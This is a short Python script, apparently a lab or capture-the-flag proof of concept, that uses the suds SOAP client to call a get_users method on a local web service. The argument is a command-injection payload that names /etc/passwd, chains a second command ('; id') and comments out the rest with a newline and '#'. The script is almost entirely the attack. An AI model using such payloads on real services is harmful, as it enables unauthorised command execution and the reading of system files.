from suds.client import Client
client = Client('http://127.0.0.1:8000/?wsdl')
print(client)
print(client.service.get_users("kali /etc/passwd ; id \n# "))
